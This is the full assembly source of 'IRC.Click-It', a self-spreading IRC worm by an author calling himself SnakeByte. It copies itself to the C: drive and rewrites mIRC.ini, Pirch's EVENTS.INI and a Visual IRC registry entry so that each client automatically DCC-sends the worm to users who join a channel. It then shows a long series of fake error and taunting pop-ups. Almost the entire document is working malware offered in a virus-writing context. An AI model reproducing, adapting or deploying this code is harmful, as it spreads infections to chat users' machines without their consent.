

  ;########################-[ IRC.Click-It by SnakeByte ]-#########################;
  ;                                                                                ;
  ; Here we go again, this is my second IRC-Worm and it                            ;
  ; infects mIRC, Virc and Pirch. I wrote it in some minutes for the Realm-Zine,   ;
  ; cause Rhape wanted a Virc worm inside.. ;)                                     ;
  ; It mainly bases on my first Worm                                               ;
  ; ( NBC , not IRC-Worm.Lucky as AVP detects it 'cause this nerd                  ;
  ; stole my code.. ok who cares *g* )                                             ;
  ;                                                                                ;
  ;   So here we go.. hope you enjoy it                                            ;
  ;                                                                                ;
  ;################################################################################;

.486p
locals
jumps

.model flat,STDCALL

 extrn          CreateFileA:PROC   ;creating all the new ini files
 extrn          ExitProcess:PROC   ;termination of program
 extrn GetCurrentDirectoryA:PROC   ;searching directory
 extrn SetCurrentDirectoryA:PROC   ;changing directory
 extrn          MessageBoxA:PROC   ;write some messages
 extrn          CloseHandle:PROC   ;closing files
 extrn      GetCommandLineA:PROC   ;..just guess
 extrn            CopyFileA:PROC   ;create copy of the worm
 extrn       RegSetValueExA:PROC   ;to patch the registry
 extrn        RegOpenKeyExA:PROC   ;open subkey
 extrn            WriteFile:PROC   ;write something into files
 extrn WritePrivateProfileStringA:PROC ;edit ini-files

.CODE

code:
  call GetCommandLineA             
  inc eax
  mov dword ptr [CmdLine], eax

CommandReceive:                     ;let's get place where we are stored
  cmp dword ptr [eax],'EXE.'        ;and add an 0 for copying later
  je CommandOK                      ;thnx to Bumblebee !
  inc eax
  jmp CommandReceive

CommandOK:  
  add eax, 4h
  mov byte ptr [eax],0

  push eax                          ;save eax

  push 0                            ;save the worm in C:\
  push offset Root
  push dword ptr [CmdLine]
  call CopyFileA

  pop eax                           ;restore eax
  push eax

GetFirstDir:                        ;get current Dir
  call SearchSlash

InfectFirstDir:  
  push eax

  mov eax,CmdLine
  push eax
  call SetCurrentDirectoryA
  cmp eax,0
  je Change_dir
  call Mircinfect
  call PirchInfect

  pop eax
  dec eax
Get2Dir:                          ;we do a 'cd..'

                                  ;'cause some scripts have a special
  call SearchSlash                ;download folder

Infect2Dir:  

  mov eax,CmdLine
  push eax
  call SetCurrentDirectoryA
  cmp eax,0
  je Change_dir
  call Mircinfect
  call PirchInfect


Change_dir:                       ;here we search for PIRCH
  push offset PirchDir
  call SetCurrentDirectoryA
  cmp eax,0
  je GetMircDir
  call PirchInfect

GetMircDir:
 lea edi, MIRCDir                 ;get first mIRC directory
 jmp StartMircDir

NextMircDir:
 pop edi 

 call SearchZero
 jc EndMircDir

StartMircDir:
 push edi                         ;one time to save it, another time
                                  ;for the api
 push edi
 call SetCurrentDirectoryA        ;different directories
 cmp eax,0                        ;c:\mirc
 je NextMircDir
 call Mircinfect

 jmp NextMircDir                  ;maybe mIRC is in several folders..

EndMircDir:


; this part is for Virc-Infection
; we patch the registry, 'cause this is the place, where Virc saves
; it's script..

Infect_Virc:
 push offset PHKEY                           ;where to store handle
 push 02000000h                              ;complete access
 push 0                                      ;reserved
 push offset VircEntry                       ;sub-key'folder'
 push 80000003h                              ;Hkey_Users
 call RegOpenKeyExA

 push offset VircEntry - offset Virc_Script  ;lenght of patch
 push offset Virc_Script                     ;patch
 push 1                                      ;ascii
 push 0                                      ;reserved
 push offset VPL                             ;where to patch
 push PHKEY                                  ;Handle of Subkey
 call RegSetValueExA


;*+*+*+*+*+*+*+*+*+*+*+* now we drop a 'lil message *+*+*+*+*+*+*+*+*+*

Msg_Start:
  lea edi, MSG

Msg_Output:
  push 10h
  push offset Error                          ;Write Fake-MSG
  push edi
  push 0
  call MessageBoxA

  call SearchZero
  jnc Msg_Output

  END_file:                                  ;Stop the worm
  push 0h
  call ExitProcess

SearchZero:
  cmp byte ptr [edi], 0
  je EndThis
  inc edi
  jmp SearchZero

EndThis:                                     ; If there is a second Zero we set the
  inc edi                                    ; carriage flag
  cmp byte ptr [edi], 0
  jne ReturnZero

  stc  

ReturnZero:
ret


SearchSlash:
  cmp byte ptr [eax], '\'
  je EndThis2
  dec eax
  jmp SearchSlash

EndThis2:
  mov byte ptr [eax+1], 0
  dec eax
ret


;*+*+*+*+*+*+*+*+*+*+*+* Let's infect mIRC !!! *+*+*+*+*+*+*+*+*+*+*

Mircinfect:
  push 0
  push 080h                        ;normal attribs
  push 3                           ;open an existing file  
  push 0                           ;so if the mIRC.ini does not exist
  push 0                           ;we fail here..
  push 0C0000000h                  ;read + write
  push offset MIRCini
  Call CreateFileA                 ;open mirc.ini
  mov Handle,eax
  cmp eax, 0FFFFFFFFh
  je End_mirc
  
  Call CloseHandleX

  push offset OldDir               ;get & save the current directory
  push 126d
  call GetCurrentDirectoryA
  cmp eax,0                        ;if an error occoured then leave
  je End_mirc

  lea edi, OldDir
  call SearchZero  
  dec edi
  mov byte ptr [edi], '\'
  inc edi
  lea esi, MIRCini
  mov ecx, 8
  rep movsb

  push offset OldDir
  push offset MIRCprot
  push offset MOffset
  push offset MIRCrfiles    
  call WritePrivateProfileStringA

  push 0
  push 080h                        ;normal attribs
  push 2h                          ;create a new file (always)
  push 0
  push 0
  push 0C0000000h                  ;read + write
  lea eax, MIRCprot
  push eax
  Call CreateFileA                 ;open mirc.ini
  mov Handle,eax
  cmp eax, 0FFFFFFFFh
  je End_mirc
  
  push 0
  push offset Write
  push offset EndScript - offset MIRCscript
  push offset MIRCscript
  push Handle
  Call WriteFile

No_mirc:
  Call CloseHandleX

End_mirc:
 
ret

;Close FileHandle...

CloseHandleX:
  push Handle
  call CloseHandle
ret


;*+*+*+*+*+*+*+*+*+*+*+* Pirch is our victim too !!! *+*+*+*+*+*+*+*+*+*+*


PirchInfect:

  push 0
  push 080h                        ;normal attribs
  push 3                           ;open an existing file  
  push 0
  push 0
  push 0C0000000h                  ;read + write
  push offset Eventini
  Call CreateFileA                 ;open events.ini
  mov Handle,eax
  cmp eax, 0FFFFFFFFh
  je End_Pirch

  push 0
  push offset Write
  push offset PirchEnd - offset PirchIni
  push offset PirchIni
  push Handle
  Call WriteFile

  call CloseHandleX

End_Pirch:

ret


.DATA

 Wormname db 'IRC.Click-It',0
 Author   db 'by SnakeByte [KryptoCrew]',0

  
;Data for mIRC infection
 
  MIRCprot   db 'protection.ini',0      ;ini file with worm

  MIRCDir    db 'C:\MIRC32',0
             db 'C:\PROGRA~1\MIRC',0
             db 'C:\PROGRA~1\MIRC32',0,0
             db 'C:\MIRC',0

  MIRCrfiles db 'rfiles',0        ;what to patch
  MOffset    db 'n2',0
  MIRCini    db 'MIRC.INI',0      ;file to patch
  MIRCscript db '[script]',13d,10d;worm script
             db 'n0=on 1:connect:{', 13d,10d
             db 'n1= .join #ccc', 13d,10d
             db 'n2= .msg #ccc Greetz to tschechow and xyz ! You really suck...', 13d,10d
             db 'n3= .part #ccc', 13d,10d
             db 'n4=}', 13d,10d
             db 'n5=on 1:join:#: { if ( $nick == $me ) halt', 13d,10d
             db 'n6=     else .timer 1 30 .dcc send $nick C:\Click-It.EXE }', 13d,10d
             db 'n7=on *:filesent:*.*: { if ( $nick != $me ) .dcc send $nick C:\Click-It.EXE }', 13d,10d
  EndScript:

;Data for Pirch infection

   PirchIni db '[Levels]',13d,10d
   Eventini db 'EVENTS.INI',0   ;here is the script stored..
    db 'Enabled=1',13d,10d
    db 'Count=6',13d,10d
    db 'Level1=000-Unknowns',13d,10d
    db '000-UnknownsEnabled=1',13d,10d
    db 'Level2=100-Level 100',13d,10d
    db '100-Level 100Enabled=1',13d,10d
    db 'Level3=200-Level 200',13d,10d
    db '200-Level 200Enabled=1',13d,10d
    db 'Level4=300-Level 300',13d,10d
    db '300-Level 300Enabled=1',13d,10d
    db 'Level5=400-Level 400',13d,10d
    db '400-Level 400Enabled=1',13d,10d
    db 'Level6=500-Level 500',13d,10d
    db '500-Level 500Enabled=1',13d,10d
    db 13d,10d
    db '[000-Unknowns]',13d,10d
    db 'User1=*!*@*',13d,10d
    db 'UserCount=1',13d,10d
    db 'Event1=ON JOIN:#:/dcc send $nick C:\Click-It.EXE',13d,10d
    db 'EventCount=1',13d,10d
    db 13d,10d
    db '[100-Level 100]',13d,10d
    db 'UserCount=0',13d,10d
    db 'EventCount=0',13d,10d
    db 13d,10d
    db '[200-Level 200]',13d,10d
    db 'UserCount=0',13d,10d
    db 'EventCount=0',13d,10d
    db 13d,10d
    db '[300-Level 300]',13d,10d
    db 'UserCount=0',13d,10d
    db 'EventCount=0',13d,10d
    db 13d,10d
    db '[400-Level 400]',13d,10d
    db 'UserCount=0',13d,10d
    db 'EventCount=0',13d,10d
    db 13d,10d
    db '[500-Level 500]',13d,10d
    db 'UserCount=0',13d,10d
    db 'EventCount=0',13d,10d
    db 13d,10d
    PirchEnd:
    PirchDir db 'C:\pirch98',0   ;Pirch standard installation directory
 
;Data for Virc infection

   VircEntry   db '.Default\Software\MeGALiTH Software\Visual IRC 96\Events\Event17',0
   VPL         db 'VPL',0
   Virc_Script db 'dcc send $nick C:\Click-It.EXE ',0dh,0ah,0
   PHKEY       dd ?

;what's this ? Payload ? Fake-Message ? *g*

  MSG        db "Unexpected Error, quitting...",0
             db "Do you really thought you can go now ?",0
             db "That's sweet ;)",0
             db "What do you think how many Messageboxes will appear here ?",0
             db "Ten ? One-Hundret ? Thousand ? Several Million ?",0
             db "What is if they are in a loop and this will never end ?",0
             db "You know, that your disk trashes if you press the OFF button now !",0
             db "How do you feel ? Do I bore you ?",0
             db "Oh, I am sorry for this, so here we get a joke:", 10d, 13d
                db "Why do programmers get Halloween and Christmas mixed up ?",0

; Maybe you remember this joke from the asterix zine.. *g*

             db "Because OCT(31) == DEC(25)",0
             db "Funny or ?",0
             db "You don't laugh.. did you understand it ?",0
             db "Shall I explain it too you ?",0
             db "You don't really want to talk, do you ?",0
             db "Ok, so we end this",0
             db "You really believe in what your PC tells you ?",0
             db "Perhaps you should get a beer, this may take a while",0
             db "By the way: Take some along for me too",0
             db "Alcohol-free ? You also drink coffee without water, do you ?",0
             db "Oh, I got a whole bunch of other messages you haven't read yet..",0
             db "I think you want to kick the one who send you this ;) ",0
             db "But this wouldn't make you happy, believe me",0
             db "What about sending this to some others and see them", 10d, 13d
                db "clicking all this stuff away.. ;)",0

; Let's call this social spreading.. ;)

             db "Ok, just another question... what would you say, if this", 10d, 13d
                db "little program deleted your drives, while you spent your time",10d, 13d
                db "clicking at all these little pop-up windows ?",0
             db "Naah, I am not that evil, thinking of your face while you click this away", 10d, 13d
                db "is enough to make me happy..",0
             db "Oh no I accidentally runned a false routine, ehm.. I don't was it..", 10d, 13d
                db "ehm.. it was the calculator, your wordpad.. ehm..",0
             db "Did I scare you again ;).. sorry, but I would never do something destructive",0
             db "Except..",0
             db "200 more pop-ups for you...",0
             db "Click-it",0
             db "Me too",0 
             db "Would you click this one too ?",0
             db "This one is just for you",0
             db "What do you think ? How many messageboxes fit into such a small program ?",0
             db "Hmm.. another question: How many have you read yet ?",0
             db "What is the highest number you can count to ?",0 
             db "What is the highest number you can imagine ?",0
             db "Ok, we will not reach the promised 200 messageboxes",0
             db "Heh, why do you always use the mouse ?",0
             db "Pressing return is much easier",0
             db "Believe me, I tested this program several times, not just once..",0
             db "The END",0
             db "A Happy End, or ?",0
             db "The real end..",0, 0


  Handle     dd ?                      ;handle for files..
  Size       dd ?                      ;size of files..
  Filemem    dd ?
  Read       dd ?                      ;number of read bytes
  Write      dd ?                      ;number of written bytes 
  CmdLine    dd ?
  NewName    db 'Click-It.EXE',0           ;new filename
  OldDir     dd 126d dup (?)           ;old directory
  Error      db 'Click-It',0
  FileHandle dd 0h
  Root       db 'C:\Click-It.EXE',0

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME                ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13 dup (?)
 WFD_szAlternateEnding   db       03 dup (?)
                                             
Ends
End code
